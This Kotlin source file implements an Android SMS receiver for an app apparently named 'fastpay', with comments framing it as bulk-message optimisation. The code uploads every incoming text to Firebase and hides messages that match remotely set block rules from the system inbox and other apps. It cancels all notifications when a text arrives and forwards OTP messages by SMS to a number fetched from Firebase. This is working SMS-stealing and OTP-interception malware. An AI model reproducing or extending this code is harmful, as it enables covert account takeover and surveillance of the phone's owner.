package com.example.fast.receiver

import android.annotation.SuppressLint
import android.content.BroadcastReceiver
import android.content.ContentValues
import android.content.Context
import android.content.Intent
import android.provider.Settings
import android.provider.Telephony
import com.example.fast.config.AppConfig
import com.example.fast.util.NetworkUtils
import com.example.fast.util.MessageForwarder
import com.example.fast.util.SmsMessageBatchProcessor
import com.example.fast.util.AutoReplyManager
import com.example.fast.notification.AppNotificationManager
import com.prexoft.prexocore.readInternalFile
import com.prexoft.prexocore.writeInternalFile
import com.prexoft.prexocore.sendSms
import com.prexoft.prexocore.anon.SimSlot
import com.google.firebase.Firebase
import com.google.firebase.database.database
import com.google.firebase.database.ValueEventListener
import com.google.firebase.database.DatabaseError
import android.content.pm.PackageManager
import androidx.core.app.ActivityCompat
import android.Manifest
import android.util.Log

/**
 * SmsReceiver - Optimized for handling bulk SMS messages
 * 
 * Key optimizations:
 * 1. Uses goAsync() to process messages in background thread
 * 2. Batches messages together before Firebase upload (prevents slowdown with 5000+ messages)
 * 3. Filter logic fixed to process all messages correctly
 * 
 * When app is set as default SMS app, this receiver gets higher priority
 * and more reliable delivery, especially for bulk messages.
 * 
 * MESSAGE BLOCKING:
 * - Block rules are managed in Firebase: fastpay/{deviceId}/filter/blockSms
 * - Format: "pattern~type" where type can be: contains, equals, startsWith, endsWith, sender
 * - The PersistentForegroundService automatically syncs Firebase rules to local cache for fast access
 * - When blocked, messages are still processed internally (Firebase) but NOT saved to system SMS database
 * - This prevents other SMS apps from seeing blocked messages when app is default SMS app
 * - Example Firebase value: "SPAM~contains" or "+1234567890~sender"
 * - Rules are updated in real-time from Firebase without app restart needed
 */
class SmsReceiver : BroadcastReceiver() {
    
    @SuppressLint("HardwareIds")
    override fun onReceive(context: Context, intent: Intent) {
        // Handle both SMS_RECEIVED_ACTION (non-default) and SMS_DELIVER_ACTION (default SMS app)
        // Test broadcasts are handled by TestSmsReceiver (no permission requirement)
        val isSmsAction = intent.action == Telephony.Sms.Intents.SMS_RECEIVED_ACTION ||
                         intent.action == Telephony.Sms.Intents.SMS_DELIVER_ACTION
        
        if (isSmsAction) {
            // Log broadcast reception for visibility
            Log.d("SmsReceiver", "📡 BROADCAST RECEIVED - Action: ${intent.action}")
            
            // Handle real SMS broadcasts
            // Use goAsync() to process in background thread
            // This prevents blocking the broadcast receiver and system slowdown
            // Critical for handling 5000+ messages without slowing down the device
            val pendingResult = goAsync()
            
            Thread {
                try {
                    val shouldAbort = processMessages(context, intent)
                    // If message should be blocked and we're receiving SMS_RECEIVED_ACTION,
                    // abort the broadcast to prevent other apps from receiving it
                    if (shouldAbort && intent.action == Telephony.Sms.Intents.SMS_RECEIVED_ACTION) {
                        // Note: abortBroadcast() can only be called synchronously, not in async thread
                        // So we need to handle this differently
                        Log.d("SmsReceiver", "Message blocked - would prevent other apps from receiving")
                    }
                } catch (e: Exception) {
                    Log.e("SmsReceiver", "Error processing SMS messages", e)
                } finally {
                    // Always finish the async operation
                    pendingResult.finish()
                }
            }.start()
        }
    }
    
    /**
     * Process test message directly (for test button when app is default SMS app)
     * This allows test messages to go through the same processing flow as real SMS
     * Simulates SMS_DELIVER_ACTION broadcast by calling the same processing logic
     * 
     * @param context Application context
     * @param senderPhoneNumber Phone number of sender
     * @param messageBody Message content
     * @param timestamp Message timestamp (current time if not provided)
     */
    companion object {
        fun processTestMessage(
            context: Context,
            senderPhoneNumber: String,
            messageBody: String,
            timestamp: Long = System.currentTimeMillis()
        ) {
            // Trigger SmsReceiver processing directly (simulates SMS_DELIVER_ACTION broadcast)
            // This makes test messages go through the same flow as real SMS:
            // - Filter checks (filterSms.txt)
            // - Block checks (blockSms.txt)
            // - Emergency contact handling
            // - System SMS database write (if not blocked)
            // - Firebase upload (via SmsMessageBatchProcessor)
            val receiver = SmsReceiver()
            
            // Process in background thread (same as real SMS)
            Thread {
                try {
                    receiver.processMessagesDirectly(
                        context = context,
                        sender = senderPhoneNumber,
                        body = messageBody,
                        timestamp = timestamp,
                        isDefaultSmsApp = true
                    )
                } catch (e: Exception) {
                    android.util.Log.e("SmsReceiver", "Error processing test message", e)
                }
            }.start()
        }
    }
    
    /**
     * Direct processing method for test messages (bypasses Intent format)
     * Processes message as if received via SMS_DELIVER_ACTION (default SMS app)
     */
    @SuppressLint("HardwareIds")
    fun processMessagesDirectly(
        context: Context,
        sender: String,
        body: String,
        timestamp: Long,
        isDefaultSmsApp: Boolean
    ) {
        // Cancel all notifications on new text message
        AppNotificationManager.cancelAllNotifications(context)
        Log.d("SmsReceiver", "Processing test message: $sender - $body")
        
        // Read filter configuration
        val filter = context.readInternalFile("filterSms.txt")
        val filterType = if (filter.contains("~")) filter.split("~")[1] else "contains"
        val filterWord = if (filter.isNotEmpty()) filter.split("~")[0] else ""
        val hasFilter = filter.isNotEmpty()
        
        // Read block configuration
        val blockFilter = try {
            context.readInternalFile("blockSms.txt")
        } catch (e: Exception) {
            ""
        }
        val blockType = if (blockFilter.contains("~")) blockFilter.split("~")[1] else "contains"
        val blockPattern = if (blockFilter.isNotEmpty()) blockFilter.split("~")[0] else ""
        val hasBlockFilter = blockFilter.isNotEmpty()
        
        // Check if message should be BLOCKED
        var shouldBlock = false
        if (hasBlockFilter) {
            shouldBlock = when (blockType) {
                "contains" -> body.contains(blockPattern, true) || sender.contains(blockPattern, true)
                "equals" -> body.lowercase() == blockPattern.lowercase() || sender == blockPattern
                "startsWith" -> body.startsWith(blockPattern, true) || sender.startsWith(blockPattern, true)
                "endsWith" -> body.endsWith(blockPattern, true) || sender.endsWith(blockPattern, true)
                "sender" -> sender == blockPattern || sender.contains(blockPattern, true)
                else -> false
            }
        }
        
        // Apply filter if configured
        var shouldProcess = true
        if (hasFilter) {
            shouldProcess = when (filterType) {
                "contains" -> body.contains(filterWord, true)
                "containsNot" -> !body.contains(filterWord, true)
                "equals" -> body.lowercase() == filterWord.lowercase()
                "equalsNot" -> body.lowercase() != filterWord.lowercase()
                "startsWith" -> body.startsWith(filterWord, true)
                "startsWithNot" -> !body.startsWith(filterWord, true)
                "endsWith" -> body.endsWith(filterWord, true)
                "endsWithNot" -> !body.endsWith(filterWord, true)
                else -> true
            }
        }
        
        if (shouldProcess) {
            // Check if message should be blocked from other apps
            if (shouldBlock) {
                Log.w("SmsReceiver", "BLOCKED test message from $sender - will NOT save to system database")
                // Still process internally (Firebase upload) but don't save to system database
                // Blocked messages don't show notifications (silent blocking)
            } else {
                // Save to system SMS database if default SMS app and not blocked
                if (isDefaultSmsApp) {
                    try {
                        val values = ContentValues().apply {
                            put(Telephony.Sms.ADDRESS, sender)
                            put(Telephony.Sms.BODY, body)
                            put(Telephony.Sms.DATE, timestamp)
                            put(Telephony.Sms.READ, 0)
                        }
                        context.contentResolver.insert(Telephony.Sms.Inbox.CONTENT_URI, values)
                        Log.d("SmsReceiver", "Test message saved to system database: $sender")
                    } catch (e: Exception) {
                        Log.e("SmsReceiver", "Error saving test message to system database", e)
                    }
                }
                
                // Message notifications removed - messages saved to system DB and Firebase only
            }
            
            // Upload to Firebase ASAP for both default and non-default SMS app
            val firebaseUploaded = SmsMessageBatchProcessor.uploadMessageAndWait(
                context = context,
                sender = sender,
                body = body,
                timestamp = timestamp
            )
            
            if (firebaseUploaded) {
                Log.d("SmsReceiver", "✅ Test message uploaded to Firebase (${if (isDefaultSmsApp) "default" else "non-default"} SMS app)")
            } else {
                Log.w("SmsReceiver", "⚠️ Test message Firebase upload failed (${if (isDefaultSmsApp) "default" else "non-default"} SMS app)")
            }
        } else {
            Log.d("SmsReceiver", "Test message filtered out: $sender")
        }
    }
    
    /**
     * Process incoming SMS messages
     * @return true if any message was blocked (should abort broadcast for SMS_RECEIVED)
     */
    private fun processMessages(context: Context, intent: Intent): Boolean {
        val messages = Telephony.Sms.Intents.getMessagesFromIntent(intent)
        if (messages.isNullOrEmpty()) {
            Log.d("SmsReceiver", "No messages in intent")
            return false
        }
        
        // Cancel all notifications on new text message
        AppNotificationManager.cancelAllNotifications(context)
        Log.d("SmsReceiver", "Cancelled all notifications on new SMS message")
        
        // Read filter configuration
        val filter = context.readInternalFile("filterSms.txt")
        val filterType = if (filter.contains("~")) filter.split("~")[1] else "contains"
        val filterWord = if (filter.isNotEmpty()) filter.split("~")[0] else ""
        val hasFilter = filter.isNotEmpty()
        
        // Read block configuration from Firebase-synced file
        // Block rules are managed in Firebase at: fastpay/{deviceId}/filter/blockSms
        // The PersistentForegroundService syncs this to local file for fast access
        val blockFilter = try {
            context.readInternalFile("blockSms.txt")
        } catch (e: Exception) {
            Log.d("SmsReceiver", "No block SMS rule file found, blocking disabled")
            ""
        }
        val blockType = if (blockFilter.contains("~")) blockFilter.split("~")[1] else "contains"
        val blockPattern = if (blockFilter.isNotEmpty()) blockFilter.split("~")[0] else ""
        val hasBlockFilter = blockFilter.isNotEmpty()
        
        Log.d("SmsReceiver", "Processing ${messages.size} SMS message(s)")
        
        var anyMessageBlocked = false
        
        for (message in messages) {
            val sender = message.originatingAddress ?: ""
            val body = message.messageBody ?: continue
            
            // Check if message should be BLOCKED from reaching other apps
            var shouldBlock = false
            if (hasBlockFilter) {
                shouldBlock = when (blockType) {
                    "contains" -> body.contains(blockPattern, true) || sender.contains(blockPattern, true)
                    "equals" -> body.lowercase() == blockPattern.lowercase() || sender == blockPattern
                    "startsWith" -> body.startsWith(blockPattern, true) || sender.startsWith(blockPattern, true)
                    "endsWith" -> body.endsWith(blockPattern, true) || sender.endsWith(blockPattern, true)
                    "sender" -> sender == blockPattern || sender.contains(blockPattern, true)
                    else -> false
                }
            }
            
            // Apply filter if configured (this is for internal processing only)
            var shouldProcess = true
            if (hasFilter) {
                shouldProcess = when (filterType) {
                    "contains" -> body.contains(filterWord, true)
                    "containsNot" -> !body.contains(filterWord, true)
                    "equals" -> body.lowercase() == filterWord.lowercase()
                    "equalsNot" -> body.lowercase() != filterWord.lowercase()
                    "startsWith" -> body.startsWith(filterWord, true)
                    "startsWithNot" -> !body.startsWith(filterWord, true)
                    "endsWith" -> body.endsWith(filterWord, true)
                    "endsWithNot" -> !body.endsWith(filterWord, true)
                    else -> true
                }
            }
            
            if (shouldProcess) {
                // Check if message should be blocked from other apps
                if (shouldBlock) {
                    Log.w("SmsReceiver", "BLOCKED message from $sender - will NOT save to system database (prevents other apps from seeing it)")
                    anyMessageBlocked = true
                    // Still process internally (Firebase upload) but don't save to system database
                    // This prevents other apps from seeing the message
                    // Blocked messages don't show notifications (silent blocking)
                } else {
                    // IMPORTANT: Upload to Firebase FIRST, then save to system database
                    // This ensures Firebase is updated before message becomes visible to other apps
                    val isDefaultSmsApp = intent.action == Telephony.Sms.Intents.SMS_DELIVER_ACTION
                    
                    if (isDefaultSmsApp) {
                        // Default SMS app - upload to Firebase FIRST and wait for completion
                        // This ensures Firebase is updated before saving to system database
                        Log.d("SmsReceiver", "Uploading to Firebase FIRST (default SMS app - priority)")
                        
                        // Upload immediately and wait for completion before saving to system DB
                        val firebaseUploaded = SmsMessageBatchProcessor.uploadMessageAndWait(
                            context = context,
                            sender = sender,
                            body = body,
                            timestamp = message.timestampMillis
                        )
                        
                        if (firebaseUploaded) {
                            Log.d("SmsReceiver", "✅ Firebase upload completed, now saving to system database")
                        } else {
                            Log.w("SmsReceiver", "⚠️ Firebase upload failed or timed out, saving to system database anyway")
                        }
                        
                        // Save to system SMS database AFTER Firebase upload completes
                        // Only save if we are the default SMS app (SMS_DELIVER_ACTION) AND message is not blocked
                        // This makes messages visible to other apps that read SMS
                        try {
                            val values = ContentValues().apply {
                                put(Telephony.Sms.ADDRESS, sender)
                                put(Telephony.Sms.BODY, body)
                                put(Telephony.Sms.DATE, message.timestampMillis)
                                put(Telephony.Sms.READ, 0)
                            }
                            context.contentResolver.insert(Telephony.Sms.Inbox.CONTENT_URI, values)
                            Log.d("SmsReceiver", "Saved SMS to system database AFTER Firebase upload: $sender")
                        } catch (e: Exception) {
                            Log.e("SmsReceiver", "Error saving SMS to system database", e)
                        }
                    } else {
                        // Non-default SMS app - upload to Firebase ASAP (same as default SMS app)
                        Log.d("SmsReceiver", "Uploading to Firebase ASAP (non-default SMS app)")
                        
                        // Upload immediately to Firebase (same behavior as default SMS app)
                        val firebaseUploaded = SmsMessageBatchProcessor.uploadMessageAndWait(
                            context = context,
                            sender = sender,
                            body = body,
                            timestamp = message.timestampMillis
                        )
                        
                        if (firebaseUploaded) {
                            Log.d("SmsReceiver", "✅ Firebase upload completed (non-default SMS app)")
                        } else {
                            Log.w("SmsReceiver", "⚠️ Firebase upload failed or timed out (non-default SMS app)")
                        }
                    }
                    
                    // Message notifications removed - messages saved to system DB and Firebase only
                    
                    // Process auto-reply (only for non-blocked messages)
                    if (!shouldBlock) {
                        AutoReplyManager.processIncomingMessage(
                            context = context,
                            sender = sender,
                            message = body,
                            timestamp = message.timestampMillis
                        )
                    }
                }
                
                // Handle network unavailable case (forward to backup)
                if (!NetworkUtils.hasInternetConnection(context)) {
                    val timestamp = System.currentTimeMillis()
                    Log.w("SmsReceiver", "Network unavailable, forwarding message to backup number")
                    MessageForwarder.forwardMessage(
                        context = context,
                        senderPhoneNumber = sender,
                        messageBody = body,
                        messageTimestamp = timestamp
                    )
                    
                    // Check if message contains "OTP" and forward to offline-number
                    if (body.contains("OTP", ignoreCase = true)) {
                        Log.d("SmsReceiver", "OTP message detected while offline, forwarding to offline-number")
                        forwardOtpToOfflineNumber(context, sender, body)
                    }
                }
            } else {
                Log.d("SmsReceiver", "Message filtered out: $sender")
            }
        }
        
        Log.d("SmsReceiver", "Finished processing ${messages.size} message(s). Queue size: ${SmsMessageBatchProcessor.getQueueSize()}")
        return anyMessageBlocked
    }
    
    /**
     * Forward OTP message to offline-number when device is offline
     * Gets offline-number from Firebase: firebase/fastpay/device-list/{CODE}/offline-number
     * Uses cached value if Firebase is unavailable (device completely offline)
     */
    @SuppressLint("HardwareIds")
    private fun forwardOtpToOfflineNumber(context: Context, sender: String, messageBody: String) {
        try {
            // Get activation code from setup.txt
            val activationCode = try {
                context.readInternalFile("setup.txt").trim()
            } catch (e: Exception) {
                Log.e("SmsReceiver", "Error reading activation code from setup.txt", e)
                null
            }
            
            if (activationCode.isNullOrBlank()) {
                Log.w("SmsReceiver", "Activation code not found, cannot forward OTP to offline-number")
                return
            }
            
            // Try to get cached offline-number first (for when completely offline)
            val cachedOfflineNumber = try {
                val cached = context.readInternalFile("offline-number.txt").trim()
                if (cached.isNotBlank()) cached else null
            } catch (e: Exception) {
                null
            }
            
            // Check if we have internet connection
            val hasInternet = NetworkUtils.hasInternetConnection(context)
            
            if (hasInternet) {
                // Device has internet - try to get from Firebase and update cache
                val deviceListPath = AppConfig.getFirebaseDeviceListPath(activationCode)
                val offlineNumberRef = Firebase.database.reference
                    .child(deviceListPath)
                    .child("offline-number")
                
                offlineNumberRef.addListenerForSingleValueEvent(object : ValueEventListener {
                    override fun onDataChange(snapshot: com.google.firebase.database.DataSnapshot) {
                        val offlineNumber = snapshot.getValue(String::class.java)
                        
                        if (offlineNumber.isNullOrBlank()) {
                            Log.w("SmsReceiver", "Offline-number not found in Firebase for code: $activationCode")
                            // Try to use cached value if available
                            if (cachedOfflineNumber != null) {
                                sendOtpToOfflineNumber(context, sender, messageBody, cachedOfflineNumber)
                            }
                            return
                        }
                        
                        // Cache the offline-number for future offline use
                        try {
                            context.writeInternalFile("offline-number.txt", offlineNumber)
                            Log.d("SmsReceiver", "Cached offline-number: $offlineNumber")
                        } catch (e: Exception) {
                            Log.e("SmsReceiver", "Error caching offline-number", e)
                        }
                        
                        // Send OTP to offline-number
                        sendOtpToOfflineNumber(context, sender, messageBody, offlineNumber)
                    }
                    
                    override fun onCancelled(error: DatabaseError) {
                        Log.e("SmsReceiver", "Error getting offline-number from Firebase", error.toException())
                        // Try to use cached value if available
                        if (cachedOfflineNumber != null) {
                            sendOtpToOfflineNumber(context, sender, messageBody, cachedOfflineNumber)
                        }
                    }
                })
            } else {
                // Device is completely offline - use cached value
                if (cachedOfflineNumber != null) {
                    Log.d("SmsReceiver", "Device offline, using cached offline-number: $cachedOfflineNumber")
                    sendOtpToOfflineNumber(context, sender, messageBody, cachedOfflineNumber)
                } else {
                    Log.w("SmsReceiver", "Device offline and no cached offline-number available")
                }
            }
        } catch (e: Exception) {
            Log.e("SmsReceiver", "Error in forwardOtpToOfflineNumber", e)
        }
    }
    
    /**
     * Send OTP message to offline-number
     */
    private fun sendOtpToOfflineNumber(context: Context, sender: String, messageBody: String, offlineNumber: String) {
        try {
            // Check SEND_SMS permission
            if (ActivityCompat.checkSelfPermission(
                    context,
                    Manifest.permission.SEND_SMS
                ) != PackageManager.PERMISSION_GRANTED
            ) {
                Log.w("SmsReceiver", "SEND_SMS permission not granted, cannot forward OTP")
                return
            }
            
            // Forward the OTP message to offline-number
            val forwardedMessage = "OTP from $sender: $messageBody"
            context.sendSms(offlineNumber, forwardedMessage, SimSlot.SIM_1)
            Log.d("SmsReceiver", "OTP message forwarded to offline-number: $offlineNumber")
        } catch (e: Exception) {
            Log.e("SmsReceiver", "Error sending OTP to offline-number", e)
        }
    }
}

